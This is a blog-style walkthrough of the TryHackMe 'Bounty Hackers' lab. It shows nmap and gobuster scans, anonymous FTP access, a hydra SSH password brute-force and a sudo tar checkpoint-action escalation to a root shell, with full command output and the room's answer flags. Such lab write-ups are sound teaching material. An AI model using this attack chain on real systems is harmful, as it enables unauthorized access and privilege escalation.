---
title: "TryHackMe Bounty Hackers CTF"
date: 2022-11-13 17:49:00 +0100
categories: [TryHackMe, CTF]
tags: [tryhackme, ctf, hacking, kali linux, offensive]     # TAG names should always be lowercase
---


My Write-up of the TryHackMe CTF Bounty Hackers:

## Scan
First I start with a nmap scan. I like to use the -A (equivalent to -sV -O -sC --traceroute) flag and scan all ports (-p-):

```bash
$ nmap -A -p- 10.10.162.62 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-10 09:45 EST
Nmap scan report for 10.10.162.62
Host is up (0.031s latency).
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can´t get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:xxx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn´t have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.33 seconds
```

3 open ports, one website on port 80, ftp and ssh.
So let´s start with the website and check it out:

![bounty hackers website](/assets/img/post-images/bounty-hackers.png)

I used gobuster for directory scanning:

```bash
$ gobuster dir -u http://10.10.162.62  -w /usr/share/wordlists/dirbuster/directory-1ist-2.3-medium.txt 
============================================================
Gobuster v3.1.0 
by OJ Reeves (@TheClonia1) & Christian Mehlmauer (@firefart)
============================================================
[+] Url:                    http://10.10.162.62 
[+] Method :                GET
[+] Threads:                10
[+] Wordlist:               /usr/share/word1ists/dirbuster/directory-1ist-2.3-medium.txt
[+] Negative Status codes:  404
[+] User Agent:             gobuster/3.1.0
[+] Timeout:                10s
============================================================
2022/11/10 09:46:37 Starting gobuster in directory enumeration mode 
============================================================
/images             (Status: 301) [Size: 313] [--> http://10.10.162.62/images/] 
Progress: 1062 / 220561 (0.48%) 
```
Even though I let it finish, I didn´t find anything of interest.

## Enumeration

So on to the next option, FTP. In the NMAP scan we saw that anonymous login is enabled, so let´s log in:
```bash
$ ftp 10.10.162.62 21
Connected to 10.10.162.62.
220 (vsFTPd 3.0.3)
Name (10.10.162.62:krussve): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||44405|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> get locks.txt
local: locks.txt remote: locks.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |*************************************************************************************|   418        9.82 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (5.52 KiB/s)
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |*************************************************************************************|    68        1.01 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.68 KiB/s)
ftp> 
```

Looking at the first file we have a bunch of words, which look a lot like potential passwords:
```bash
$ cat locks.txt                          
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

Through the second file we get a username 'lin' which might be used to answer **Q3**:
```bash
$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
## Initial access
We have everything we need to try and attack SSH using hydra, which also answers **Q4**:
```bash
$ hydra -l lin -P locks.txt 10.10.162.62 ssh                           
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-10 10:02:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.162.62:22/
[22][ssh] host: 10.10.162.62   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-10 10:02:29
```

And we´ve got: 'login: lin' and 'password: RedDr4gonSynd1cat3'. So answer Q5 and login to SSH:
```bash
$ ssh lin@10.10.162.62           
The authenticity of host '10.10.162.62 (10.10.162.62)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.162.62' (ED25519) to the list of known hosts.
lin@10.10.162.62's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```
## Privilege Escalation
We immediately got the user flag for **Q6**. Now we start with privilege escalation to become root.
I usually start by checking ```sudo -l``` and got lucky.
We can abuse the tar functionality of setting checkpoints. the ```checkpoint=1``` creates the checkpoint before reading the Nth record. In our case, the checkpoint is done immediately. The ```--checkpoint-action=exec=/bin/sh``` is an action done within that checkpoint. In our case, we create a shell and since the process is executed with sudo, we get root access, hurray!
So just find the root directory and then the flag for **Q7**.

```shell
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/` from member names
# ls
user.txt
# whoami
Root
# cd ..
# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
# cd ..
# ls
lin
# cd ..
# ls
bin   cdrom  etc   initrd.img      lib    lost+found  mnt  proc  run   snap  sys  usr  vmlinuz
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   tmp  var  vmlinuz.old
# cd root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
```